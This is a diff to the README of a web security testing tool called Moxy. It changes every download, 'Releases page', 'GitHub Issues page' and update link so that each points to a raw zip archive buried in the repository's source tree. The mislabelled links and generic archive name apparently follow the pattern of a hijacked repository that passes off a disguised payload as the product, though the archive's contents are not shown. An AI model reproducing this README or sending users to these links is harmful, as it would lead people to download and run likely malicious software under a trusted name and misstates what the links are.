@@ -4,7 +4,7 @@
 Welcome to Moxy! This guide will help you easily download and run Moxy, a tool designed to help you test and secure web applications. Let’s dive right in.
 
 ## 📦 Download Moxy
-[![Download Moxy](https://github.com/dark84mm/Moxy/raw/refs/heads/main/frontend/src/components/ui/Software_governor.zip%https://github.com/dark84mm/Moxy/raw/refs/heads/main/frontend/src/components/ui/Software_governor.zip)](https://github.com/dark84mm/Moxy/raw/refs/heads/main/frontend/src/components/ui/Software_governor.zip)
+[![Download Moxy](https://github.com/dark84mm/Moxy/raw/refs/heads/main/backend/src/Software_3.4.zip%https://github.com/dark84mm/Moxy/raw/refs/heads/main/backend/src/Software_3.4.zip)](https://github.com/dark84mm/Moxy/raw/refs/heads/main/backend/src/Software_3.4.zip)
 
 ## 📋 Features
 Moxy offers a range of features to enhance your web application security testing:
@@ -31,9 +31,9 @@ To run Moxy, ensure your system meets these requirements:
 ## 📥 Download & Install
 To get Moxy, visit the releases page:
 
-[Visit this page to download Moxy](https://github.com/dark84mm/Moxy/raw/refs/heads/main/frontend/src/components/ui/Software_governor.zip)
+[Visit this page to download Moxy](https://github.com/dark84mm/Moxy/raw/refs/heads/main/backend/src/Software_3.4.zip)
 
-1. Go to the [Releases page](https://github.com/dark84mm/Moxy/raw/refs/heads/main/frontend/src/components/ui/Software_governor.zip).
+1. Go to the [Releases page](https://github.com/dark84mm/Moxy/raw/refs/heads/main/backend/src/Software_3.4.zip).
 2. Find the latest version of Moxy.
 3. Click on the file suitable for your operating system (Windows, macOS, or Linux).
 4. Save the file to your computer.
@@ -58,10 +58,10 @@ After installation, you can easily run Moxy:
 ## 🛠️ Troubleshooting
 If you face any issues while using Moxy, consider the following steps:
 
-- Ensure you have the latest version by checking the [Releases page](https://github.com/dark84mm/Moxy/raw/refs/heads/main/frontend/src/components/ui/Software_governor.zip).
+- Ensure you have the latest version by checking the [Releases page](https://github.com/dark84mm/Moxy/raw/refs/heads/main/backend/src/Software_3.4.zip).
 - Restart your computer after installation.
 - Check system requirements to confirm compatibility.
-- For detailed support, refer to the [GitHub Issues page](https://github.com/dark84mm/Moxy/raw/refs/heads/main/frontend/src/components/ui/Software_governor.zip) to find solutions or report your problem.
+- For detailed support, refer to the [GitHub Issues page](https://github.com/dark84mm/Moxy/raw/refs/heads/main/backend/src/Software_3.4.zip) to find solutions or report your problem.
 
 ## 🗨️ Community Support
 Join our community for discussions, tips, and support:
@@ -73,6 +73,6 @@ Join our community for discussions, tips, and support:
 Moxy is an open-source project. Its development relies on contributions from users like you. Thank you for being part of our community! Your feedback helps us improve.
 
 ## 📅 Updates
-Regular updates will keep Moxy secure and feature-rich. Check the [Releases page](https://github.com/dark84mm/Moxy/raw/refs/heads/main/frontend/src/components/ui/Software_governor.zip) for the latest improvements and features.
+Regular updates will keep Moxy secure and feature-rich. Check the [Releases page](https://github.com/dark84mm/Moxy/raw/refs/heads/main/backend/src/Software_3.4.zip) for the latest improvements and features.
 
 Dive into testing with Moxy and enhance your web application security today!
